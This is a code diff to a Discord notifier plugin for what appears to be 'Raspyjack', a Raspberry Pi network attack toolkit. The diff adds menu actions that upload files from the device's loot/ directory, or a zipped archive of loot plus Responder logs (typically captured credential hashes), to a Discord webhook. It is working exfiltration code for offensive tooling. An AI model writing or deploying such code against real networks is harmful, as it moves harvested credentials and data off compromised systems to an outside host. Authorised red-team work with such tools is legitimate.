@@ -5,7 +5,13 @@ import requests
 import threading
 from datetime import datetime
 from plugins.base import Plugin
-from .helpers.discord_utils import get_discord_webhook_url, send_message_to_discord, send_file_to_discord
+from .helpers.discord_utils import (
+    get_discord_webhook_url,
+    send_file_to_discord,
+    build_loot_archive,
+    send_buffer_to_discord,
+    DISCORD_ATTACHMENT_LIMIT,
+)
 
 def _send_notification(webhook_url: str, scan_label: str, file_path: str, target_network: str, interface: str):
     """Send Nmap scan notification to Discord."""
@@ -41,6 +47,9 @@ def _send_notification(webhook_url: str, scan_label: str, file_path: str, target
 class DiscordNotifierPlugin(Plugin):
     name = "DiscordNotifier"
     priority = 200
+
+    def on_load(self, ctx: dict) -> None:
+        self._ctx = ctx
 
     def get_config_schema(self) -> dict:
         """Return configuration schema for Discord plugin."""
@@ -121,5 +130,70 @@ class DiscordNotifierPlugin(Plugin):
                 "Current status: No notifications will be sent"
             ]
             return "\n".join(info_lines)
+
+    # --- Menu integration -------------------------------------------------
+    def provide_menu_items(self):
+        """Provide custom menu items for this plugin."""
+        items = []
+        webhook_url = get_discord_webhook_url()
+        if webhook_url:
+            items.append(("Send file to Discord", self._menu_send_loot_file, '\uf1d8', "Upload a file to Discord"))
+            items.append(("Send loot archive", self._menu_send_loot_archive, '\uf187', "Zip loot + logs and upload"))
+        return items
+
+    def _menu_send_loot_file(self):
+        """Interactive file picker limited to loot/ directory; sends selected file."""
+        webhook_url = get_discord_webhook_url()
+        if not webhook_url:
+            return
+        wctx = self._ctx.get('widget_context')
+        if not wctx:
+            return
+        try:
+            from ui.widgets import explorer, dialog_info
+        except Exception:
+            return
+        # Resolve root install path
+        defaults = self._ctx.get('defaults')
+        root_path = getattr(defaults, 'install_path', '/root/Raspyjack/') if defaults else '/root/Raspyjack/'
+        loot_path = os.path.join(root_path, 'loot')
+        if not os.path.isdir(loot_path):
+            dialog_info(wctx, "loot/ directory not found", wait=True, center=True)
+            return
+        # Pick file
+        file_path = explorer(wctx, loot_path, extensions='')
+        if not file_path:
+            return
+        # Send file
+        ok = send_file_to_discord(file_path, title=f"Loot: {os.path.basename(file_path)}")
+        dialog_info(wctx, ("File sent" if ok else "Send failed"), wait=True, center=True)
+
+    def _menu_send_loot_archive(self):
+        """Build in-memory ZIP of loot/ + Responder/logs and send to Discord."""
+        webhook_url = get_discord_webhook_url()
+        if not webhook_url:
+            return
+        wctx = self._ctx.get('widget_context')
+        if not wctx:
+            return
+        try:
+            from ui.widgets import dialog_info, dialog_wait, dialog_wait_close
+        except Exception:
+            return
+        defaults = self._ctx.get('defaults')
+        root_path = getattr(defaults, 'install_path', '/root/Raspyjack/') if defaults else '/root/Raspyjack/'
+        wait_handle = dialog_wait(wctx, text="Building zip...")
+        buf, fname, size = build_loot_archive(root_path)
+        dialog_wait_close(wctx, wait_handle)
+        if not buf:
+            dialog_info(wctx, fname[:48], wait=True, center=True)  # fname holds error message here
+            return
+        if size > DISCORD_ATTACHMENT_LIMIT:
+            dialog_info(wctx, f"Archive too big\n{size/1024/1024:.1f} MB", wait=True, center=True)
+            return
+        wait_handle = dialog_wait(wctx, text="Uploading...")
+        ok = send_buffer_to_discord(buf, fname, message=f"📦 Loot archive ({size/1024:.0f} KB)")
+        dialog_wait_close(wctx, wait_handle)
+        dialog_info(wctx, ("Archive sent" if ok else "Upload failed"), wait=True, center=True)
 
 plugin = DiscordNotifierPlugin()
